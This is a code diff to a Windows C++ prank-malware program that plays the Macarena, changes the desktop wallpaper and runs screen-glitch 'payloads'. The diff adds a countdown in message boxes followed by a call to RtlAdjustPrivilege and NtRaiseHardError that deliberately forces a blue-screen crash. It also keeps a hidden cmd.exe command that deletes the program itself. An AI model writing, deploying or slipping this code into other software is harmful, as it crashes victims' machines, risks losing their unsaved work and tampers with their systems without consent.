@@ -18,25 +18,12 @@
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "winmm")
+#pragma comment(lib, "ntdll.lib");
 
 #define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
 
-void DelMe()
-{
-    TCHAR szModuleName[MAX_PATH];
-    TCHAR szCmd[2 * MAX_PATH];
-    STARTUPINFO si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-
-    GetModuleFileName(NULL, szModuleName, MAX_PATH);
-
-    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
-
-    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-}
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
 
 /*
      Wallpaper -> 303791
@@ -293,12 +280,28 @@ int main(int argc, char* argv[], char* envp[])
     currentThread = std::thread(playMacarena);
     SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, std::toLPWSTR(wallpaper), SPIF_UPDATEINIFILE);
 
-    while (playMacarena) {
+    while (isMacarenaPlaying) {
         Lyrics::doLyric(uKnow);
         const char* uKnowChar = std::to_string(uKnow).c_str();
         Payloads::screen_bug = 1;
         uKnow++;
         Sleep(100);
     }
+    Sleep(1000);
+    Lyrics::lyricsBox("5");
+    Sleep(1000);
+    Lyrics::lyricsBox("4");
+    Sleep(1000);
+    Lyrics::lyricsBox("3");
+    Sleep(1000);
+    Lyrics::lyricsBox("2");
+    Sleep(1000);
+    Lyrics::lyricsBox("1");
+    Sleep(1000);
+    /* BSOD */
+    BOOLEAN bl = NULL;
+    ULONG response;
+    RtlAdjustPrivilege(19, 1, 0, &bl);
+    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
     return 0;
 }
